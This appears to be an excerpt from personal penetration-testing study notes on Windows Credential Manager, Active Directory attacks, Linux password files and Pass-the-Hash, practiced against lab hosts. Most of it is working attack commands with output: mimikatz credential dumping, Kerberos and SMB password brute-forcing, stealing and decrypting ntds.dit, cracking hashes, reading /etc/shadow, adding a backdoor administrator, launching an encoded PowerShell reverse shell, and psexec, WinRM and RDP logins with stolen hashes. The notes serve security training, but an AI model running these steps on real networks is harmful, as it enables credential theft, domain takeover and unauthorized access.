https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication
https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="attacking-windows-credential-manager"><a class="header" href="#attacking-windows-credential-manager">Attacking Windows Credential Manager</a></h1>
<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
<p>Windows Credential Manager is a built-in feature (since Server 2008 R2 / Windows 7) that allows users and applications to securely store credentials for other systems and websites. Credentials are stored in encrypted folders protected by DPAPI.</p>
<h2 id="credential-storage-locations-1"><a class="header" href="#credential-storage-locations-1">Credential Storage Locations</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Path</th><th>Scope</th></tr>
</thead>
<tbody>
<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></td><td>User</td></tr>
<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></td><td>User</td></tr>
<tr><td><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></td><td>User</td></tr>
<tr><td><code>%ProgramData%\Microsoft\Vault\</code></td><td>System</td></tr>
<tr><td><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></td><td>System</td></tr>
</tbody>
</table>
</div>
<p>Each vault contains a <code>Policy.vpol</code> file with AES keys (AES-128/256) protected by DPAPI. Credential Guard (newer Windows) further protects DPAPI master keys using VBS (Virtualization-based Security).</p>
<h2 id="credential-types-1"><a class="header" href="#credential-types-1">Credential Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Web Credentials</td><td>Credentials for websites/online accounts (used by IE and legacy Edge)</td></tr>
<tr><td>Windows Credentials</td><td>Login tokens for services (OneDrive), domain users, network resources, shared directories</td></tr>
</tbody>
</table>
</div>
<h2 id="enumeration-with-cmdkey"><a class="header" href="#enumeration-with-cmdkey">Enumeration with cmdkey</a></h2>
<p>List stored credentials for the current user:</p>
<pre><code class="language-cmd">cmdkey /list
</code></pre>
<p>Output fields:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Field</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Target</td><td>Resource/account name (computer, domain, or identifier)</td></tr>
<tr><td>Type</td><td>Credential kind: <code>Generic</code> (general) or <code>Domain Password</code> (domain logon)</td></tr>
<tr><td>User</td><td>Associated user account</td></tr>
<tr><td>Persistence</td><td><code>Local machine persistence</code> = survives reboots</td></tr>
</tbody>
</table>
</div>
<h2 id="impersonation-with-runas"><a class="header" href="#impersonation-with-runas">Impersonation with runas</a></h2>
<p>When a <code>Domain:interactive=</code> credential is found, impersonate the stored user:</p>
<pre><code class="language-cmd">runas /savecred /user:DOMAIN\username cmd
</code></pre>
<h2 id="exporting-vaults"><a class="header" href="#exporting-vaults">Exporting Vaults</a></h2>
<p>Export via GUI:</p>
<pre><code class="language-cmd">rundll32 keymgr.dll,KRShowKeyMgr
</code></pre>
<p>Exports are password-encrypted <code>.crd</code> files, importable on other Windows systems.</p>
<h2 id="credential-extraction-with-mimikatz"><a class="header" href="#credential-extraction-with-mimikatz">Credential Extraction with Mimikatz</a></h2>
<p>Dump credentials from LSASS memory using the <code>sekurlsa</code> module:</p>
<pre><code>mimikatz # privilege::debug
mimikatz # sekurlsa::credman
</code></pre>
<p>Alternative: manually decrypt using the <code>dpapi</code> module.</p>
<h2 id="related-tools-7"><a class="header" href="#related-tools-7">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><a href="#mimikatz">Mimikatz</a></td><td>Windows credential extraction and manipulation</td></tr>
<tr><td>SharpDPAPI</td><td>C# implementation for DPAPI attacks</td></tr>
<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
<tr><td>DonPAPI</td><td>Remote DPAPI credential extraction</td></tr>
</tbody>
</table>
</div>
<h2 id="mitre-attck-reference"><a class="header" href="#mitre-attck-reference">MITRE ATT&amp;CK Reference</a></h2>
<ul>
<li><a href="https://attack.mitre.org/techniques/T1555/004/">T1555.004 - Credentials from Password Stores: Windows Credential Manager</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="attacking-active-directory"><a class="header" href="#attacking-active-directory">Attacking Active Directory</a></h1>
<p>We can attempt to extract credentials from Active Directory (ADDS) using dictionary attacks against AD accounts and dumping hashing from the ntds.dit file.</p>
<p>Once a workstation is joined to a domain, it will no longer use the local SAM database for authentication, but will instead query the domain controller (DC) for user credentials. However, the SAM database will still be used if you login locally to the workstation. This means that if we can compromise a workstation that is part of a domain, we may be able to extract credentials for domain users.</p>
<p><img src="infosec/windows/images/ADauthentication_diagram.png" alt=""></p>
<h2 id="dictionary-attacks"><a class="header" href="#dictionary-attacks">Dictionary Attacks</a></h2>
<p>As always, dictionary attacks are noisy and typically easy to detect. However, they can be effective if you have a good wordlist and the target account has a weak password. Also note that many organizations have password policies (typically enforced via Group Policy objects) that require complex passwords, which can make dictionary attacks less effective.</p>
<p>One method of determining usernames is to use a tool like theHarvester or even LinkedIn to gather email addresses. Usernames are often the first part of the email address (e.g., jdoe for jdoe@mysite.com)</p>
<p>We can use a tool like <code>kerbrute</code> to perform a dictionary attack against Kerberos on the domain controller. This tool will attempt to authenticate to the DC using a list of usernames and passwords.</p>
<p>Once we have a list of valid usernames, we can attempt to brute-force passwords for those accounts. Here, we will use the popular <code>rockyou.txt</code> wordlist to attempt to brute-force the password for the <code>vagrant</code> user.</p>
<pre><code class="language-bash">‚îå‚îÄ‚îÄ(toor„âøblue)-[~/Downloads]
‚îî‚îÄ$ ./kerbrute_linux_amd64 bruteuser --dc 192.168.86.218 -d homelab.local /usr/share/wordlists/rockyou.txt vagrant

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/19/26 - Ronnie Flathers @ropnop

2026/01/19 13:48:38 &gt;  Using KDC(s):
2026/01/19 13:48:38 &gt;   192.168.86.218:88
2026/01/19 13:53:15 &gt;  [+] VALID LOGIN:  vagrant@homelab.local:vagrant
2026/01/19 13:53:15 &gt;  Done! Tested 114989 logins (1 successes) in 277.561 seconds
</code></pre>
<p>We can also use <code>netexec</code> to brute force a user password:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
&lt;SNIP&gt;
</code></pre>
<p>In the example above, <code>netexec</code> is using <code>smb</code> to attempt to authenticate to the DC using the <code>bwilliamson</code> username and a list of passwords from <code>fasttrack.txt</code>. When it finds a valid password, it will print it to the screen. Note that if an account lockout policy is configured (which)
is likely these days), repeated failed login attempts may lock the account, so use caution when performing brute-force attacks. Repeated and unexpected account lockouts is almost always a sign of an ongoing brute-force attack, and a sure way to get noticed. Tread lightly.</p>
<h2 id="dumping-ntdsdit"><a class="header" href="#dumping-ntdsdit">Dumping ntds.dit</a></h2>
<p>The ntds.dit file is the Active Directory database that contains all of the information about the domain, including user accounts and their hashed passwords. If we can obtain a copy of this file, we can attempt to crack the hashes offline using a tool like <code>hashcat</code> or <code>john the ripper</code>.</p>
<p>We can use <code>evil-winrm</code> to connect to a Windows machine that is part of the domain using the credentials we have obtained:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ evil-winrm -i 192.168.86.218 -u vagrant-p 'vagrant'
</code></pre>
<p>We can check with groups a user account is a member of:</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; net groups

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.

</code></pre>
<p>We can also check the password policy and find some other useful information about this user account:</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; net user vagrant
User name                    vagrant
Full Name                    vagrant
Comment                      vagrant
User's comment
Country/region code          001 (United States)
Account active               Yes
Account expires              Never

Password last set            1/13/2026 3:32:20 AM
Password expires             Never
Password changeable          1/14/2026 3:32:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/19/2026 6:56:35 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *Domain Users
The command completed successfully.

</code></pre>
<p>We can see that the <code>vagrant</code> user is a member of the <code>Domain Admins</code> group, which means we have administrative privileges on the domain. This will allow us to dump the ntds.dit file.</p>
<p>We will need to make a shadow copy of the volume that contains the ntds.dit file using <code>vssadmin</code>:</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; vssadmin create shadow /for=c:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'c:\'
    Shadow Copy ID: {f089068a-e156-493c-aa90-d08f78f2f8e9}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
*Evil-WinRM* PS C:\Users\vagrant\Documents&gt; 
</code></pre>
<p>The location of the ntds.dit file is typically <code>C:\Windows\NTDS\ntds.dit</code> (this can be changed when installing ADDS). We can copy this file from the shadow copy to a location we can access:</p>
<pre><code class="language-bash">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
</code></pre>
<p>Note: As was the case with SAM, the hashes stored in NTDS.dit are encrypted with a key stored in SYSTEM. In order to successfully extract the hashes, one must download both files.</p>
<p>We can use <code>secretsdump.py</code> from the Impacket suite to extract the hashes from the ntds.dit file:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
&lt;SNIP&gt;
</code></pre>
<h2 id="a-faster-method-using-netexec-to-capture-ntdsdit"><a class="header" href="#a-faster-method-using-netexec-to-capture-ntdsdit">A faster method: Using NetExec to capture NTDS.dit</a></h2>
<p>Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.</p>
<pre><code class="language-bash">‚îå‚îÄ‚îÄ(toor„âøblue)-[~/Downloads]
‚îî‚îÄ$ netexec smb 192.168.86.218 -u vagrant -p vagrant -M ntdsutil
SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-F78TN8NTHVE) (domain:homelab.local) (signing:True) (SMBv1:False)
SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [+] homelab.local\vagrant:vagrant (Pwn3d!)
NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\176884951
NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.86.218  445    WIN-F78TN8NTHVE  [-] wmiexec: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
NTDSUTIL    192.168.86.218  445    WIN-F78TN8NTHVE  [-] Error while dumping NTDS
</code></pre>
<p><strong>RESULTS MAY VARY DEPENDING ON ANTIVIRUS/EDR PRESENCE AND CONFIGURATION</strong></p>
<h2 id="cracking-hashes"><a class="header" href="#cracking-hashes">Cracking Hashes</a></h2>
<p>Once we have obtained the hashes from the ntds.dit file, we can attempt to crack them using a tool like <code>hashcat</code> or <code>john the ripper</code>. Here, we will use <code>hashcat</code> to attempt to crack the hashes using the <code>rockyou.txt</code> wordlist:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
</code></pre>
<h2 id="pass-the-hash-pth-considerations"><a class="header" href="#pass-the-hash-pth-considerations">Pass the Hash (PtH) considerations</a></h2>
<p>We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash. Here is an example of how this would work:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux-authentication"><a class="header" href="#linux-authentication">Linux Authentication</a></h1>
<h2 id="summary-3"><a class="header" href="#summary-3">Summary</a></h2>
<p>Linux uses Pluggable Authentication Modules (PAM) for authentication. The key modules (<code>pam_unix.so</code>, <code>pam_unix2.so</code>) are located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. PAM handles user information, authentication, sessions, and password changes.</p>
<h3 id="key-files-1"><a class="header" href="#key-files-1">Key Files</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>File</th><th>Purpose</th><th>Permissions</th></tr>
</thead>
<tbody>
<tr><td><code>/etc/passwd</code></td><td>User account info</td><td>World-readable</td></tr>
<tr><td><code>/etc/shadow</code></td><td>Password hashes</td><td>Root only</td></tr>
<tr><td><code>/etc/security/opasswd</code></td><td>Previous passwords</td><td>Root only</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="etcpasswd-1"><a class="header" href="#etcpasswd-1">/etc/passwd</a></h2>
<p>Contains user information in seven colon-separated fields:</p>
<pre><code>htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
</code></pre>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Field</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Username</td><td>Login name</td></tr>
<tr><td>Password</td><td><code>x</code> = hash in shadow file; empty = no password</td></tr>
<tr><td>UID</td><td>User ID</td></tr>
<tr><td>GID</td><td>Primary group ID</td></tr>
<tr><td>GECOS</td><td>User info (name, phone, etc.)</td></tr>
<tr><td>Home</td><td>Home directory path</td></tr>
<tr><td>Shell</td><td>Default login shell</td></tr>
</tbody>
</table>
</div>
<p><strong>Security Note:</strong> If password field contains an actual hash (rare, old systems) or the file is writable, this is a critical vulnerability.</p>
<hr>
<h2 id="etcshadow-1"><a class="header" href="#etcshadow-1">/etc/shadow</a></h2>
<p>Stores password hashes with nine colon-separated fields:</p>
<pre><code>htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
</code></pre>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Field</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Username</td><td>Login name</td></tr>
<tr><td>Password</td><td>Hashed password</td></tr>
<tr><td>Last change</td><td>Days since epoch of last change</td></tr>
<tr><td>Min age</td><td>Minimum days between changes</td></tr>
<tr><td>Max age</td><td>Maximum days before change required</td></tr>
<tr><td>Warning</td><td>Days before expiry to warn</td></tr>
<tr><td>Inactivity</td><td>Days after expiry until disabled</td></tr>
<tr><td>Expiration</td><td>Absolute expiry date</td></tr>
<tr><td>Reserved</td><td>Unused</td></tr>
</tbody>
</table>
</div>
<p><strong>Special Password Values:</strong></p>
<ul>
<li><code>!</code> or <code>*</code> = Unix password login disabled (other methods may work)</li>
<li>Empty = No password required</li>
</ul>
<h3 id="hash-format"><a class="header" href="#hash-format">Hash Format</a></h3>
<pre><code>$&lt;id&gt;$&lt;salt&gt;$&lt;hashed&gt;
</code></pre>
<div class="table-wrapper">
<table>
<thead>
<tr><th>ID</th><th>Algorithm</th></tr>
</thead>
<tbody>
<tr><td>1</td><td>MD5</td></tr>
<tr><td>2a</td><td>Blowfish</td></tr>
<tr><td>5</td><td>SHA-256</td></tr>
<tr><td>6</td><td>SHA-512</td></tr>
<tr><td>sha1</td><td>SHA1crypt</td></tr>
<tr><td>y</td><td>Yescrypt (modern default)</td></tr>
<tr><td>gy</td><td>Gost-yescrypt</td></tr>
<tr><td>7</td><td>Scrypt</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="etcsecurityopasswd"><a class="header" href="#etcsecurityopasswd">/etc/security/opasswd</a></h2>
<p>PAM stores previous passwords here to prevent reuse. Contains comma-separated historical hashes per user:</p>
<pre><code>cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
</code></pre>
<p><strong>Note:</strong> Older hashes (e.g., MD5 <code>$1$</code>) are easier to crack and may reveal password patterns.</p>
<hr>
<h2 id="cracking-linux-credentials"><a class="header" href="#cracking-linux-credentials">Cracking Linux Credentials</a></h2>
<h3 id="using-unshadow"><a class="header" href="#using-unshadow">Using unshadow</a></h3>
<p>Combine passwd and shadow files for cracking:</p>
<pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
</code></pre>
<h3 id="cracking-with-hashcat-1"><a class="header" href="#cracking-with-hashcat-1">Cracking with hashcat</a></h3>
<pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
</code></pre>
<h3 id="cracking-with-john-the-ripper-1"><a class="header" href="#cracking-with-john-the-ripper-1">Cracking with John the Ripper</a></h3>
<p>John‚Äôs single crack mode is ideal for this scenario as it uses GECOS/username data:</p>
<pre><code class="language-sh">john --single /tmp/unshadowed.hashes
</code></pre>
<p>Or with a wordlist:</p>
<pre><code class="language-sh">john --wordlist=rockyou.txt /tmp/unshadowed.hashes
</code></pre>
<hr>
<h2 id="common-hashcat-modes-for-linux"><a class="header" href="#common-hashcat-modes-for-linux">Common Hashcat Modes for Linux</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Algorithm</th></tr>
</thead>
<tbody>
<tr><td>500</td><td>MD5crypt ($1$)</td></tr>
<tr><td>1800</td><td>SHA-512crypt ($6$)</td></tr>
<tr><td>7400</td><td>SHA-256crypt ($5$)</td></tr>
<tr><td>3200</td><td>bcrypt ($2a$)</td></tr>
</tbody>
</table>
</div>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="pass-the-hash-pth-attacks"><a class="header" href="#pass-the-hash-pth-attacks">Pass the Hash (PtH) Attacks</a></h1>
<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn‚Äôt need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p>
<h2 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h2>
<p>The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>
<ul>
<li>Dumping the local SAM database from a compromised host</li>
<li>Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller</li>
<li>Pulling the hashes from memory (lsass.exe)</li>
</ul>
<h2 id="windows-ntlm-background"><a class="header" href="#windows-ntlm-background">Windows NTLM Background</a></h2>
<p>Microsoft‚Äôs Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users‚Äô identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user‚Äôs identity without having them provide a password.</p>
<p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p>
<p>With NTLM, passwords stored on the server and domain controller are not ‚Äúsalted,‚Äù which means that an adversary with a password hash can authenticate a session without knowing the original password. This is what makes Pass the Hash attacks possible.</p>
<hr>
<h2 id="pass-the-hash-from-windows"><a class="header" href="#pass-the-hash-from-windows">Pass the Hash from Windows</a></h2>
<h3 id="using-mimikatz"><a class="header" href="#using-mimikatz">Using Mimikatz</a></h3>
<p>Mimikatz has a module named <code>sekurlsa::pth</code> that allows us to perform a Pass the Hash attack by starting a process using the hash of the user‚Äôs password.</p>
<p><strong>Required Parameters:</strong></p>
<ul>
<li><code>/user</code> - The user name we want to impersonate</li>
<li><code>/rc4</code> or <code>/NTLM</code> - NTLM hash of the user‚Äôs password</li>
<li><code>/domain</code> - Domain the user belongs to. For local accounts, use the computer name, localhost, or a dot (.)</li>
<li><code>/run</code> - The program to run with the user‚Äôs context (defaults to cmd.exe)</li>
</ul>
<pre><code class="language-cmd">c:\tools&gt; mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -&gt; null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -&gt; null
</code></pre>
<p>Now you can use the spawned cmd.exe to execute commands in the user‚Äôs context.</p>
<h3 id="using-invoke-thehash-powershell"><a class="header" href="#using-invoke-thehash-powershell">Using Invoke-TheHash (PowerShell)</a></h3>
<p>Invoke-TheHash is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol.</p>
<p><strong>Note:</strong> Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.</p>
<p><strong>Required Parameters:</strong></p>
<ul>
<li><code>Target</code> - Hostname or IP address of the target</li>
<li><code>Username</code> - Username to use for authentication</li>
<li><code>Domain</code> - Domain to use for authentication (unnecessary with local accounts or when using @domain after the username)</li>
<li><code>Hash</code> - NTLM password hash for authentication (accepts LM:NTLM or NTLM format)</li>
<li><code>Command</code> - Command to execute on the target</li>
</ul>
<h4 id="smb-execution-example"><a class="header" href="#smb-execution-example">SMB Execution Example</a></h4>
<p>Create a new user and add to Administrators group:</p>
<pre><code class="language-powershell">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash&gt; Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
</code></pre>
<h4 id="wmi-execution-example-reverse-shell"><a class="header" href="#wmi-execution-example-reverse-shell">WMI Execution Example (Reverse Shell)</a></h4>
<p>First, start a netcat listener:</p>
<pre><code class="language-powershell">PS C:\tools&gt; .\nc.exe -lvnp 8001
listening on [any] 8001 ...
</code></pre>
<p>Generate a PowerShell reverse shell payload (e.g., using https://revshells.com with PowerShell #3 Base64 option), then execute:</p>
<pre><code class="language-powershell">PS c:\tools\Invoke-TheHash&gt; Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash&gt; Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e &lt;BASE64_ENCODED_PAYLOAD&gt;"
</code></pre>
<hr>
<h2 id="pass-the-hash-from-linux"><a class="header" href="#pass-the-hash-from-linux">Pass the Hash from Linux</a></h2>
<h3 id="using-impacket"><a class="header" href="#using-impacket">Using Impacket</a></h3>
<p>Impacket has several tools that support authentication via Pass the Hash, including:</p>
<ul>
<li><code>impacket-psexec</code></li>
<li><code>impacket-wmiexec</code></li>
<li><code>impacket-atexec</code></li>
<li><code>impacket-smbexec</code></li>
</ul>
<h4 id="psexec-example"><a class="header" href="#psexec-example">PsExec Example</a></h4>
<pre><code class="language-bash">$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service BnEU on 10.129.201.126.....
[*] Starting service BnEU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;
</code></pre>
<h3 id="using-netexec"><a class="header" href="#using-netexec">Using NetExec</a></h3>
<p>NetExec (formerly CrackMapExec) can execute commands using Pass the Hash.</p>
<pre><code class="language-bash">$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
</code></pre>
<h3 id="using-evil-winrm"><a class="header" href="#using-evil-winrm">Using evil-winrm</a></h3>
<p>Evil-WinRM can authenticate using Pass the Hash with PowerShell remoting. Useful if SMB is blocked or you don‚Äôt have administrative rights.</p>
<pre><code class="language-bash">$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
</code></pre>
<p><strong>Note:</strong> When using a domain account, include the domain name: <code>administrator@inlanefreight.htb</code></p>
<h3 id="using-rdp-with-xfreerdp"><a class="header" href="#using-rdp-with-xfreerdp">Using RDP with xfreerdp</a></h3>
<p>RDP PtH attacks can gain GUI access to the target system.</p>
<p><strong>Caveats:</strong></p>
<ul>
<li>Restricted Admin Mode must be enabled on the target (disabled by default)</li>
</ul>
<h4 id="enable-restricted-admin-mode"><a class="header" href="#enable-restricted-admin-mode">Enable Restricted Admin Mode</a></h4>
<p>On the target, add the registry key:</p>
<pre><code class="language-cmd">c:\tools&gt; reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
</code></pre>
<h4 id="connect-via-rdp"><a class="header" href="#connect-via-rdp">Connect via RDP</a></h4>
<pre><code class="language-bash">$ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
</code></pre>
<hr>
